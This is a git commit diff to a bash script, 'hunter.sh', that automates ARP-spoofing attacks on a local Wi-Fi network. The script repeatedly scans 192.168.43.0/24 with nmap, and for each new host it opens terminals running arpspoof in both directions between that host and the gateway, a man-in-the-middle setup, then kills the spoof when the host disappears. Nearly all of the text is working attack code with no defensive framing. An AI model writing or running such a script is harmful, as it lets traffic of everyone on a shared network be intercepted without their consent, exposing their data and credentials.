fb1acc3cac37deaf57a4933ed44df06b0f6fc320
root <root@localhost.localdomain>
2019-04-28 12:26:19 -0400

    LOOP: auto detect and arp spoof, use hunter.sh

--- hunter.sh
+++ hunter.sh
@@ -7,20 +7,23 @@ done
 output=/root/shell/damn/damn.txt
 greper=/root/shell/greper.txt
 grep2=/root/shell/grep2.txt
-records=/root/shell/records.txt
+records=/root/shell/records
+recordx=/root/shell/recordx
 while true
 do
 > $output
 > $greper
-nmap 192.168.43.0/24 >> $output
+nmap -sP 192.168.43.0/24 >> $output
 saying=$(cat $output)
 echo xxx $saying
+echo '\n'
 cd /root/shell/damn
-grep -rn "192.168.43." | grep -v "192.168.43.87" | grep -v "192.168.43.0" | grep -v "192.168.43.1">> $greper
+grep -rn "192.168.43." | grep -v "192.168.43.87)" | grep -v "192.168.43.0)" | grep -v "192.168.43.1)">> $greper
 grape=$(cat $greper)
 echo ready
 echo *** $grape
-for i in `seq 1 255`
+echo '\n'
+for i in `seq 2 255`
 do
 	str="192.168.43.${i}"
     > $grep2
@@ -30,19 +33,26 @@ do
     if [ -n "$grep2s" ]; then
         if [ ${ar[i]} == 0 ]; then
             echo "boom" $str
+            echo '\n'
             ar[i]=1
-            > $records
-            echo "arpspoof -i wlan0 -t 192.168.43.1 ${str}" >> $records
-            gnome-terminal -t "arp down ${str}" -- $records
-            > $records
-            echo "arpspoof -i wlan0 -t ${str} 192.168.43.1" >> $records
-            gnome-terminal -t "arp up ${str}" -- $records
+            chmod a+x $records${i}
+            > $records${i}
+            echo "arpspoof -i wlan0 -t 192.168.43.1 ${str}" >> $records${i}
+            gnome-terminal -t "arp down ${str}" -- $records${i}
+            chmod a+x $recordx${i}
+            > $recordx${i}
+            echo "arpspoof -i wlan0 -t ${str} 192.168.43.1" >> $recordx${i}
+            gnome-terminal -t "arp up ${str}" -- $recordx${i}
         else
             echo "already1" $str
+            echo '\n'
         fi
     else
         if [ ${ar[i]} == 1 ]; then
             ar[i]=0
+            echo "calm down" $str
+            echo '\n'
+            kill -s KILL $(ps au | grep $str | grep arpspoof | awk '{print $2}')
         fi
     fi
 done
